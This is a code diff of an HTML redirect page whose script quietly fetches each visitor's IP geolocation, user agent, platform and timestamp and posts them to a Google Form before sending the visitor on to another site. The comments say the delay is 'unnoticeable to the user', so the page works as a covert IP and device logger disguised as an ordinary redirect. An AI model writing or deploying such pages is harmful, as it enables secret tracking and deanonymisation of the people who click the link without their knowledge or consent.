@@ -7,13 +7,22 @@
         // Set the destination URL
         const REDIRECT_URL = "https://example.com";
 
-        async function initRedirectAndCapture() {
+        // This function will handle the data capture and redirect
+        async function processAndRedirect() {
+            // --- Step 1: Redirect immediately, but with a tiny delay ---
+            // This gives the data-sending process below a moment to run.
+            // The 100ms delay is unnoticeable to the user.
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 100);
+
+            // --- Step 2: Capture and send the data in the background ---
             try {
-                // 1. We MUST wait for the location data first. This is a necessary, small delay.
+                // Fetch the location data
                 const geoResponse = await fetch('https://ipapi.co/json/');
                 const geoData = await geoResponse.json();
 
-                // 2. Once we have the data, prepare it.
+                // Prepare all other data points
                 const timestamp = new Date().toISOString();
                 const userAgent = navigator.userAgent;
                 const os = navigator.platform;
@@ -36,27 +45,25 @@
                 formData.append("entry.1734202770", `${geoData.city}, ${geoData.region}, ${geoData.country_name}`);
                 formData.append("entry.448354724", userAgent);
 
-                // 3. Send the data with the 'keepalive' flag.
-                // The script does NOT wait for this to finish.
-                fetch("https://docs.google.com/forms/d/e/1FAIpQLSehg2hY3VPki5je6DE8lAmLPcXTGdk4ReZ7FCGxX_SZ3OJ0yg/formResponse", {
+                // Send the data to your Google Form
+                await fetch("https://docs.google.com/forms/d/e/1FAIpQLSehg2hY3VPki5je6DE8lAmLPcXTGdk4ReZ7FCGxX_SZ3OJ0yg/formResponse", {
                     method: "POST",
                     body: formData,
-                    mode: "no-cors",
-                    keepalive: true // This is the key change!
+                    mode: "no-cors"
                 });
 
             } catch (err) {
-                console.error(err);
-            } finally {
-                // 4. Redirect immediately after the data send has been initiated.
-                window.location.href = REDIRECT_URL;
+                // If there's an error, it will be logged in the browser console,
+                // but the user will still be redirected.
+                console.error("Data capture failed:", err);
             }
         }
 
-        // Call the function to start the process.
-        initRedirectAndCapture();
+        // Call the function to start the process
+        processAndRedirect();
     </script>
 </head>
 <body>
-    </body>
+    <!-- The body is empty for the fastest possible experience. -->
+</body>
 </html>
